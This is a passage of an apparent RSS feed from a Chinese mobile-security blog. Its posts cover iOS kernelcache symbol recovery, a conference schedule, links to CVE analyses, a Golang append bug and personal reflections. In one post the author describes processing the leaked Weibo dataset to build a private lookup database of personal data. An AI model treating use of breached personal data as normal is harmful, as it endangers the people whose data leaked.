&lt;p&gt;使用编译的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsc_extractor&lt;/code&gt;提取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dyld_shared_cache_arm64&lt;/code&gt;的符号&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  iPhone_4.7_12.4.8_16G201_Restore ./dsc_extractor dyld_shared_cache_arm64 dyld_shared_cache_arm64_symbol
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后我拿到了一堆动态库，喵喵喵，不是说好的提取符号吗？？？&lt;/p&gt;

&lt;p&gt;实在是没辙了，我决定问这篇文章的作者，一番搜索找到了作者的推特，我猜这种文章一般作者都会转发一下，果不其然，我就留言描述了我的问题，作者回复的也很迅速，大概意思就是没啥特别的好办法，从调用关系，字符串，或者有符号的kernelcache上手慢慢找&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150947251.png&quot; alt=&quot;image-20210131150947251&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我最后跟brightiupzl师傅请教了一下这个问题，大概意思就是：我这个diff没有符号固件来找漏洞的操作，对于新手来说难度有点大&lt;/p&gt;

&lt;p&gt;那iOS固件符号恢复这事到这里就暂时告一段落了，等我对iOS系统有更进一步的学习成果后我再回过头来思考这个问题，看是否有更好一点的解决方案，起码&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bzero()&lt;/code&gt;这样的得自动识别出来&lt;/p&gt;
</description>
                <pubDate>Wed, 06 Jan 2021 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/ios_security/2021/01/06/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8Dkernelcache%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98.html</link>
                <guid isPermaLink="true">http://localhost:4000/ios_security/2021/01/06/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8Dkernelcache%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.12.31 征途漫漫，惟有奋斗！</title>
                <description>&lt;p&gt;去年立的一个Flag，说要公众号关注上一千，emmmmmmmm，感谢三百零四位读者朋友们的支持！&lt;/p&gt;

&lt;p&gt;可能是我写的还不够好&lt;/p&gt;

&lt;p&gt;今年「大土豆安全笔记」一共写了三十五篇，我跟大家聊了很多我的想法，大部分是关于移动安全的&lt;/p&gt;

&lt;p&gt;我一直在重复APP审计一定不要只做纯应用的审计，本地搞的再厉害那也只是本地，把APP作为入口，找到业务接口，结合渗透的技术，拿下后台&lt;/p&gt;

&lt;p&gt;可惜我见过不少安全团队关于APP安全都是做这种纯应用的审计，或者说APP和Web分开&lt;/p&gt;

&lt;p&gt;这方面大家有兴趣可以多关注一下，移动端的业务逻辑漏洞是特别有趣的，产出也很丰富&lt;/p&gt;

&lt;p&gt;今年我的安全研究重点会转移到iOS和macOS上，有共同方向的读者朋友们欢迎加我微信一起交流&lt;/p&gt;

&lt;p&gt;好啦，话不多说，小红包谢谢大家，我研究了一会不知道怎么在文章里插入红包小程序，所以后台回复「抽奖」吧&lt;/p&gt;

&lt;p&gt;我不靠这个涨粉，真的希望大家关注我是因为认可我写的东西&lt;/p&gt;

&lt;p&gt;新的一年，祝各位读者0day多多，bounty多多！也希望大家身体健康！&lt;/p&gt;
</description>
                <pubDate>Thu, 31 Dec 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/12/31/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.12.31.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/12/31/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.12.31.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.12.28 明天的CIS见个面呀 </title>
                <description>&lt;p&gt;好久没跟各位读者聊天了，前后算下来得有一个半月了&lt;/p&gt;

&lt;p&gt;前段时间我无意中获取到了微博的那五亿数据，本着资源最大化利用的思想，我做了一些数据处理，想结合其它数据搭一个私有社工库，目前数据还在跑着，得优化一下速度了&lt;/p&gt;

&lt;p&gt;明儿个有个安全会议，我从朋友那里获得了一张票，两天时间，去跟大家交个朋友&lt;/p&gt;

&lt;p&gt;有几个不错的议题我这里记录一下，明后天学习完回来做个笔记跟大家分享，好久没参加会议了，啥都想听，啥都想学，但我感觉又是啥都没学会的一次瞎忙&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;时间&lt;/th&gt;
      &lt;th&gt;议题&lt;/th&gt;
      &lt;th&gt;Speaker&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY1 10:30 - 11:00&lt;/td&gt;
      &lt;td&gt;网络安全监测与技术创新&lt;/td&gt;
      &lt;td&gt;姚佳明 国家信息技术安全研究中心威胁监测事业部副部长&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY1 11:00 - 11:30&lt;/td&gt;
      &lt;td&gt;中国网络安全产业推进及公共服务探索&lt;/td&gt;
      &lt;td&gt;崔涛 中国信通院安全研究所网络安全部副主任&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY1 13:30 - 14:00&lt;/td&gt;
      &lt;td&gt;漫谈移动应用个人信息安全保护治理&lt;/td&gt;
      &lt;td&gt;万小博 上海互联网应急中心网络安全处项目负责人&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY1 14:00 - 14:30&lt;/td&gt;
      &lt;td&gt;网络流量安全分析的创新探索与实践&lt;/td&gt;
      &lt;td&gt;徐钟豪 斗象科技CTO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY1 14:30 - 15:00&lt;/td&gt;
      &lt;td&gt;企业安全合规与物联网隐私保护实践&lt;/td&gt;
      &lt;td&gt;宋文宽 小米集团信息安全与隐私委员会秘书长&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY1 16:20 - 16:50&lt;/td&gt;
      &lt;td&gt;智能终端隐私防跟踪技术实践&lt;/td&gt;
      &lt;td&gt;张栋 vivo千镜安全实验室安全研究员&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 14:30 - 15:00&lt;/td&gt;
      &lt;td&gt;基于业务安全情报的攻防实践&lt;/td&gt;
      &lt;td&gt;邓欣 永安在线CTO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 15:00 - 15:30&lt;/td&gt;
      &lt;td&gt;网络攻防靶场的技术经验分享&lt;/td&gt;
      &lt;td&gt;张锦章 360实网攻防中心总经理&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 15:30 - 16:00&lt;/td&gt;
      &lt;td&gt;甲方视角下的攻防演练部署&lt;/td&gt;
      &lt;td&gt;谭超 某航司信息安全专家&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 16:00 - 16:30&lt;/td&gt;
      &lt;td&gt;钓鱼演练：基于攻防模式的人为因素风险教育&lt;/td&gt;
      &lt;td&gt;宋琼 上海易念信息科技有限公司产品研发总监&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 16:00 - 16:30&lt;/td&gt;
      &lt;td&gt;漏洞挖掘和检测在智能设备中的最佳实践&lt;/td&gt;
      &lt;td&gt;杨成明 美团安全专家&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 10:30 - 11:10&lt;/td&gt;
      &lt;td&gt;我的一键 getshell 代码开发之路&lt;/td&gt;
      &lt;td&gt;Ali0th 斗象科技资深安全研究员&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 11:10 - 11:50&lt;/td&gt;
      &lt;td&gt;ATT&amp;amp;CK 红队战术漫谈&lt;/td&gt;
      &lt;td&gt;Haya 木星安全实验室 红队负责人&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 13:00 - 13:40&lt;/td&gt;
      &lt;td&gt;Redteaming：主流杀软对抗之路&lt;/td&gt;
      &lt;td&gt;伍智波，scareing 自由红队攻防研究员&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 13:40 - 14:20&lt;/td&gt;
      &lt;td&gt;威胁情报挖掘浅谈&lt;/td&gt;
      &lt;td&gt;杨帆 斗象科技高级安全研究员&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 14:20 - 15:00&lt;/td&gt;
      &lt;td&gt;在代码中审计漏洞的世界&lt;/td&gt;
      &lt;td&gt;吕行 360网络安全专家，资深安全白帽&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 15:00 - 15:40&lt;/td&gt;
      &lt;td&gt;MacOS目录权限漏洞挖掘&lt;/td&gt;
      &lt;td&gt;CK01 WPS安全研究员，破晓团队核心成员&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 15:40 - 16:20&lt;/td&gt;
      &lt;td&gt;APP审计之白帽必杀技&lt;/td&gt;
      &lt;td&gt;凌迟 移动端安全建设及安全攻防专家&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;还有一个线上的反诈论坛&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;时间&lt;/th&gt;
      &lt;th&gt;议题&lt;/th&gt;
      &lt;th&gt;Speaker&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 13:30 - 14:00&lt;/td&gt;
      &lt;td&gt;网络违法犯罪产业链发展趋势研究&lt;/td&gt;
      &lt;td&gt;张瑞冬 成都无糖信息技术有限公司创始人、CEO，PKAV技术团队负责人&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 14:00 - 14:30&lt;/td&gt;
      &lt;td&gt;虚拟货币时代如何反诈骗和反洗钱&lt;/td&gt;
      &lt;td&gt;李瑞 PeckShield 反洗钱（AML）业务负责人&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DAY2 14:30 - 15:00&lt;/td&gt;
      &lt;td&gt;无处不在的黑色产业链&lt;/td&gt;
      &lt;td&gt;辛巴 FreeBuf年度作者&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;这段时间我扩展看了些iOS/macOS相关的资料&lt;/p&gt;

&lt;p&gt;《CVE-2020-27897: APPLE MACOS KERNEL OOB WRITE PRIVILEGE ESCALATION VULNERABILITY》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.thezdi.com/blog/2020/12/9/cve-2020-27897-apple-macos-kernel-oob-write-privilege-escalation-vulnerability&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://alexplaskett.github.io/CVE-2020-9967/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Examining CVE-2020-27932 on macOS 10.15.7》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://worthdoingbadly.com/specialreply/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《IOS 1-DAY HUNTING: UNCOVERING AND EXPLOITING CVE-2020-27950 KERNEL MEMORY LEAK》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.synacktiv.com/en/publications/ios-1-day-hunting-uncovering-and-exploiting-cve-2020-27950-kernel-memory-leak.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对了，我发现一个特别神奇的软件，叫作Notion，个人版本免费，支持Android，iOS，MacOS，Windows多平台&lt;/p&gt;

&lt;p&gt;我还在研究，等我弄明白了再写一篇使用心得，真的很好用，记笔记，项目推进，时间管理，贼方便&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/54741AEBE6B36EB1556A09DBCC33C296.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Mon, 28 Dec 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/12/28/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.12.28.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/12/28/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.12.28.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.10.30 我是热爱学习的民间安全人士</title>
                <description>&lt;p&gt;今天开始我就是民间安全人士了&lt;/p&gt;

&lt;p&gt;该学习还是要学习，不然以后咋和各位老板们吹牛逼&lt;/p&gt;

&lt;p&gt;Gartner发布了2021年的科技战略趋势&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://emtemp.gcom.cloud/ngw/globalassets/en/information-technology/documents/insights/top-tech-trends-ebook-2021.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下载这个报告也是有趣，一开始我是看到的其他人的中文解读，我想着这玩意还是看原文比较好，起码不夹带私货，谁想它需要填一大堆资料，然后我就瞎填，填完后弹一个按钮出来下载，下载完我也是手欠搜了一下，这个下载链接就在源码里…&lt;/p&gt;

&lt;p&gt;九大趋势全在表格里了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BA2EDA208F3BB9139C2C1228BE7CDB23.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;理解起来挺费劲的，我也没掌握透&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;行为互联网&lt;/li&gt;
  &lt;li&gt;全面体验&lt;/li&gt;
  &lt;li&gt;隐私增强计算&lt;/li&gt;
  &lt;li&gt;分布式云&lt;/li&gt;
  &lt;li&gt;随处运营&lt;/li&gt;
  &lt;li&gt;网络安全网格&lt;/li&gt;
  &lt;li&gt;组装式智能企业&lt;/li&gt;
  &lt;li&gt;人工智能工程化&lt;/li&gt;
  &lt;li&gt;超级自动化&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;以前我是对这些新名词一点兴趣都没有，结果现在转行卖鞋之后却对这些东西开始感兴趣了&lt;/p&gt;

&lt;p&gt;这都不是我一个月薪三千的人该想的事儿&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;前几天网信办又公布一批被治理APP清单，我说的吧，上头现在愿意有所为，这是好事&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/_YKGDaZdu6tnbTm3BO4Nuw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以前出这种清单我真的是提心吊胆的看完，一个字一个字读到最后，然后又倒着读到开头，最后确定没有我司产品才松一口气，以后没有这烦恼了&lt;/p&gt;

&lt;p&gt;这中间有个小插曲，迪士尼说清单里面提到的“上海迪士尼乐园”不是他们开发的，这就尴尬了，迪士尼的律师函正在路上…&lt;/p&gt;

&lt;p&gt;现在整治的目标并没有提前告知，不过从历史清单来看，未成年人教育类是一个重头&lt;/p&gt;

&lt;p&gt;具体的网信办通知大家可以看这里，今年七月份出来的，新鲜热乎&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3C59392E44A31DD5D6B4122242685545.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;网信办最新要治理的是浏览器信息流，信息流这东西跟头条有点像，这里面的新闻真假参半，跟头条一样，一刷就停不下来，所以我真不想用国产的浏览器，Safari保平安，最后的净土&lt;/p&gt;

&lt;p&gt;《国家网信办对手机浏览器扰乱网络传播秩序突出问题开展专项集中整治》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/XV4okTZ_vnnPEkC7Hj03fQ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里面加粗提到的，就是现在国产浏览器的现状了，&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/581ED4D7366B55B7E2F764F2AA68DBBE.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;干翻这群一天到晚瞎鸡儿标题党编故事的人&lt;/p&gt;
</description>
                <pubDate>Fri, 30 Oct 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/10/30/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.10.30.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/10/30/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.10.30.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.09.29 谢谢各位</title>
                <description>&lt;p&gt;跟各位道个别，个人原因，以后菜栏不再更新&lt;/p&gt;

&lt;p&gt;真心感谢两百四十八位读者朋友的支持，本月底我会清空掉所有关注的读者&lt;/p&gt;

&lt;p&gt;今天不谈技术，最后闲聊一次吧&lt;/p&gt;

&lt;p&gt;我算是一个话比较多的人，一个搞二进制的，话这么多，不知道是不是少见，我印象中搞二进制的朋友大多都比较内向&lt;/p&gt;

&lt;p&gt;突然发现我跟安全圈的关系挺有趣，跟刷SRC的小白帽不熟，跟刷CTF的赛棍不熟，跟刷安全会议的会棍不熟，零星认识一些大佬，也都散落在各个安全团队里，这里就不列出来了，一只手就可以数过来&lt;/p&gt;

&lt;p&gt;你说我搞移动安全，那些Web圈的不认识也就算了，然而移动圈的我也不怎么熟，这就很尴尬了&lt;/p&gt;

&lt;p&gt;这不行啊，我这一肚子话没有群可以吹啊，所以这个菜栏就出现了&lt;/p&gt;

&lt;p&gt;我记得去年还是前年，有人统计了安全圈活跃的技术博主，我翻了三遍没有看到我，我一个保持周更安全笔记，偶尔还带两篇高质量漏洞分析的人竟然上不了榜，罢了罢了&lt;/p&gt;

&lt;p&gt;想想也是，我连微博都注销掉了，平时也就推上面看看师傅们转发的安全资讯，一个如此躁动的人就这样活生生的被遗忘了&lt;/p&gt;

&lt;p&gt;我的安全生涯也暂时到这里了，接下去先专心减肥，人一胖就出现各种问题，大家真的要注意，千万别胖&lt;/p&gt;

&lt;p&gt;把秋天的第一杯奶茶，换成茶&lt;/p&gt;

&lt;p&gt;我以前太局限了，把自己限定在安卓应用的漏洞领域里，其实业务安全可以玩的更有趣&lt;/p&gt;

&lt;p&gt;这段时间换了点有意思的方向扩展下眼界，看了很多文章，走了不少弯路，一个重要方向就是风控，我认识的一些朋友都去搞了风控相关，跟钱相关的就是好玩&lt;/p&gt;

&lt;p&gt;《欢迎来到风控时代》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.zhihu.com/roundtable/risk&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;口碑不错的《风控要略》，我还没看，国庆的时候仔细读一读&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A2AEDB0CAF13C09AF7D753E3A8786FA6.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有个哥们写了个Instagram的RCE分析，我一直想搞这种类型的漏洞，精力有限，业务这一块搞的精疲力尽，不知道明年有没有空整一下安全研究，各位老板带带我&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://research.checkpoint.com/2020/instagram_rce-code-execution-vulnerability-in-instagram-app-for-android-and-ios/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Android WebView的UXSS，我个人对XSS这种类型的漏洞没啥兴趣，现在逻辑漏洞比较吃香，内存破坏也还行&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://alesandroortiz.com/articles/uxss-android-webview-cve-2020-6506/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;剩下的大家有洞修洞，没洞的看个热闹&lt;/p&gt;

&lt;p&gt;火狐浏览器在局域网可被远程打开任意网页，这里的打开网页只是一个示例，它其实是发送Intent来触发行为，所以第一个Poc视频展示的是打开拨号界面​&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-tech-notes/-/tree/master/firefox-android-2020&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最近医院跑的勤，状态不太好，搞不动那么多东西了，大家凑合着看，我一不开广告，二不接推广，三没有付费，天天高质量不可能的，各位就当每末看个消遣&lt;/p&gt;

&lt;p&gt;真舍不得数字的食堂&lt;/p&gt;
</description>
                <pubDate>Tue, 29 Sep 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/09/29/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.09.29.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/09/29/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.09.29.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.09.11 秋天，开始收获了</title>
                <description>&lt;p&gt;上周末去了草原，爬山加六公里徒步，我还是喜欢去沿海城市，吃喝玩乐，一条龙服务&lt;/p&gt;

&lt;p&gt;工具写完了，开始收获漏洞&lt;/p&gt;

&lt;p&gt;准备去一些官方站下一些ROM，关于ROM的解包这些是需要再写一个自动化的工具，因为现在高版本都会自带优化，直接提取出来的APK其实不包含多少代码，其中的一些技术细节我在之前《小米REDMI 5 Plus Second Space密码绕过》里提过，接下来我也会再单独写一篇讲讲&lt;/p&gt;

&lt;p&gt;我感觉真是欠了很多”单独写一篇“&lt;/p&gt;

&lt;p&gt;放心，有生之年肯定不会跳票&lt;/p&gt;

&lt;p&gt;Golang真的是让人一言难尽，我上周不是说我用Golang重写了Smali文件读取模块嘛，结果这周扫描微信的时候就开始出现Bug&lt;/p&gt;

&lt;p&gt;我通过递归来搜索路径，上一层搜索到的路径会返回给上一层进行合并操作，结果就踩坑了，可以看到回到上一层之后搜索路径就发生了变化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A940D9A4B72CAC68FC596B164C4E72D7.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;后来学习了Golang的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;append&lt;/code&gt;才明白其中问题所在，我举个例子，比如我现在有一个容量为1L的水桶A，我想要把一杯100ml的水和水桶A里的水合并，这时候Golang会先判断水桶A的容量够不够，如果够，直接在剩余空间添加，如果不够，就会先把水桶A换成另一个容量为2L的水桶，对应的操作就是换了个地址，重新开辟内存空间，空间开辟完了，再去添加，所以此时原先的水桶就会发生变化&lt;/p&gt;

&lt;p&gt;也就是说，我在对路径进行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;append&lt;/code&gt;操作的时候，其实这个路径可能已经变化了，我再拿这个值做操作，可能会出现非预期，解决方案就是做拷贝，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path&lt;/code&gt;拷贝一份去&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;append&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dest := make([]string, len(path))
copy(dest, path)
allPath = append(allPath, dest)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以后不写Golang了，不然小命休矣&lt;/p&gt;

&lt;p&gt;这两天是华为开发者大会，果然跟对了组织还愁啥吃喝，这丰富的生态太强了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/5A9A10E405E953B2D55F9222EABCA481.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图里的认证是很厉害的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EE79DE40F27ACCA9FDCF2AA572CB3A71.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;让我最惊喜的是今年的IOT&lt;/p&gt;

&lt;p&gt;回家模式&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D0EF40E68F3B47AC15AB9B6A77FACD24.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;会客模式&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D885EA6B738A022A7EF446DC51AEE47B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这种万物互联的感觉是真的好&lt;/p&gt;

&lt;p&gt;我曾经在想，我以后装修房子的时候是肯定要考虑全屋智能的，选苹果系，产品不够丰富，而且壁垒有点高，并且价格贵，选谷歌，得爬梯子，选国内的厂商广告太多&lt;/p&gt;

&lt;p&gt;现在看来，可以选择华为了&lt;/p&gt;

&lt;p&gt;还有一个重要原因，我觉得我很有必要安排上这个&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F93C2425BDBC108AF251D4FD6BA65916.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发布会结束后，鸿蒙开源了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://openharmony.gitee.com/openharmony&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;自从华为对外公开鸿蒙以来，我总会听到各种质疑鸿蒙的声音，有意思的是这些持质疑态度的往往不是搞移动安全的，我也不知道这群人哪里来的信心来评价，张口就来吗？&lt;/p&gt;

&lt;p&gt;我对鸿蒙的态度一直是支持的，接下来我想加入华为的生态，这一把我要跟上组织的脚步&lt;/p&gt;

&lt;p&gt;我猜大家朋友圈应该被《一部手机失窃而揭露的窃取个人信息实现资金盗取的黑色产业链》刷屏了吧&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/3UeZzw2LmPsM3cU7Rhmb8w&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说真的，是真的惊心动魄，这事要是发生在普通人身上，一点办法都没有&lt;/p&gt;

&lt;p&gt;但是这篇文章现在已经被删除了，我猜是某些不可抗拒的因素吧，不解决问题，光顾着遮羞，能进步吗？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3E2A7F9B34ED4ADB9B7E9055AA584A39.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;圈内大佬Atum师傅做了一些扩展研究&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/231106722?utm_source=wechat_session&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作者说手机锁屏密码被绕过，作为移动安全领域的一名底层小兵，除了作者的猜测说远程解锁这种方式之外，在开启了adb调试模式的情况下还可以通过锁屏软件的拒绝服务来进入系统，当然了，这里不排除更有技术含量的0day&lt;/p&gt;

&lt;p&gt;还有一种可能，就是人家是真的盯上你了，你在外面解锁手机的时候，瞅你一眼解锁密码，妥妥的&lt;/p&gt;

&lt;p&gt;最后感慨一下，不止一位师傅跟我说让我少跟别人说自己的挖洞思路，少说，多做，把鱼分给别人，不要把渔分给别人&lt;/p&gt;

&lt;p&gt;我一直都没听进去，现在听进去了，谢谢师傅们！&lt;/p&gt;

&lt;p&gt;明天去看《信条》，周末愉快~&lt;/p&gt;
</description>
                <pubDate>Fri, 11 Sep 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/09/11/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.09.11.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/09/11/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.09.11.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.09.04 又双叒叕写了一个工具</title>
                <description>&lt;p&gt;最近真的是沉迷写各种工具&lt;/p&gt;

&lt;p&gt;是的，造了很多轮子，你看这轮子，它又大又圆&lt;/p&gt;

&lt;p&gt;这周主要做的就是优化扫描性能，同样的代码，同样的应用，我在MBP上三分钟就出结果，放服务器跑，整整跑了八个小时&lt;/p&gt;

&lt;p&gt;这玩意挺考验文件读写性能的，所以我从软件硬件两个角度同时优化，换了960G的SSD，用Go重新写了图搜索模块，舒服多了&lt;/p&gt;

